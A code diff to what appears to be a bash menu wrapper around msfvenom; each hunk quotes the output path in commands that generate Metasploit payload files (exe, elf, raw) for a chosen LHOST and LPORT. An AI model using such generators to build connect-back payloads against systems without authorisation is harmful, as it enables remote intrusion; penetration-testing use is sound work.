@@ -293,7 +293,7 @@ while :; do
             echo "20" ; sleep 0.3
             echo "# Preparing To Create File.." ; sleep 0.3 # sadece boş ama hoş :D
             echo "50" ; sleep 0.3
-            echo "# Creating File To ${setdir}/${namefile}" ; msfvenom -p "${payload}" LHOST="${lhost}" LPORT="${lport}" -f exe -o ${setdir}/${namefile}
+            echo "# Creating File To ${setdir}/${namefile}" ; msfvenom -p "${payload}" LHOST="${lhost}" LPORT="${lport}" -f exe -o "${setdir}/${namefile}"
             echo "75" ; sleep 0.3
             echo "# Complated Job." ; sleep 0.3 # sadece boş ama hoş :D
             echo "100" ; sleep 0.3
@@ -320,7 +320,7 @@ while :; do
             echo "20" ; sleep 0.3
             echo "# Preparing To Create File.." ; sleep 0.3 # sadece boş ama hoş :D
             echo "50" ; sleep 0.3
-            echo "# Creating File To ${setdir}/${namefile}" ; msfvenom -p "${payload}" LHOST="${lhost}" LPORT="${lport}" -f exe -o ${setdir}/${namefile}
+            echo "# Creating File To ${setdir}/${namefile}" ; msfvenom -p "${payload}" LHOST="${lhost}" LPORT="${lport}" -f exe -o "${setdir}/${namefile}"
             echo "75" ; sleep 0.3
             echo "# Complated Job." ; sleep 0.3 # sadece boş ama hoş :D
             echo "100" ; sleep 0.3
@@ -376,7 +376,7 @@ while :; do
             echo "20" ; sleep 0.3
             echo "# Preparing To Create File.." ; sleep 0.3 # sadece boş ama hoş :D
             echo "50" ; sleep 0.3
-            echo "# Creating File To ${setdir}/${namefile}" ; msfvenom -p "${payload}" LHOST="${lhost}" LPORT="${lport}" R -o ${setdir}/${namefile}
+            echo "# Creating File To ${setdir}/${namefile}" ; msfvenom -p "${payload}" LHOST="${lhost}" LPORT="${lport}" R -o "${setdir}/${namefile}"
             echo "75" ; sleep 0.3
             echo "# Complated Job." ; sleep 0.3 # sadece boş ama hoş :D
             echo "100" ; sleep 0.3
@@ -403,7 +403,7 @@ while :; do
             echo "20" ; sleep 0.3
             echo "# Preparing To Create File.." ; sleep 0.3 # sadece boş ama hoş :D
             echo "50" ; sleep 0.3
-            echo "# Creating File To ${setdir}/${namefile}" ; msfvenom -p "${payload}" LHOST="${lhost}" LPORT="${lport}" R -o ${setdir}/${namefile}
+            echo "# Creating File To ${setdir}/${namefile}" ; msfvenom -p "${payload}" LHOST="${lhost}" LPORT="${lport}" R -o "${setdir}/${namefile}"
             echo "75" ; sleep 0.3
             echo "# Complated Job." ; sleep 0.3 # sadece boş ama hoş :D
             echo "100" ; sleep 0.3
@@ -459,7 +459,7 @@ while :; do
             echo "20" ; sleep 0.3
             echo "# Preparing To Create File.." ; sleep 0.3 # sadece boş ama hoş :D
             echo "50" ; sleep 0.3
-            echo "# Creating File To ${setdir}/${namefile}" ; msfvenom -p "${payload}" LHOST="${lhost}" LPORT="${lport}" -f elf -o ${setdir}/${namefile}
+            echo "# Creating File To ${setdir}/${namefile}" ; msfvenom -p "${payload}" LHOST="${lhost}" LPORT="${lport}" -f elf -o "${setdir}/${namefile}"
             echo "75" ; sleep 0.3
             echo "# Complated Job." ; sleep 0.3 # sadece boş ama hoş :D
             echo "100" ; sleep 0.3
@@ -486,7 +486,7 @@ while :; do
             echo "20" ; sleep 0.3
             echo "# Preparing To Create File.." ; sleep 0.3 # sadece boş ama hoş :D
             echo "50" ; sleep 0.3
-            echo "# Creating File To ${setdir}/${namefile}" ; msfvenom -p "${payload}" LHOST="${lhost}" LPORT="${lport}" -f elf -o ${setdir}/${namefile}
+            echo "# Creating File To ${setdir}/${namefile}" ; msfvenom -p "${payload}" LHOST="${lhost}" LPORT="${lport}" -f elf -o "${setdir}/${namefile}"
             echo "75" ; sleep 0.3
             echo "# Complated Job." ; sleep 0.3 # sadece boş ama hoş :D
             echo "100" ; sleep 0.3
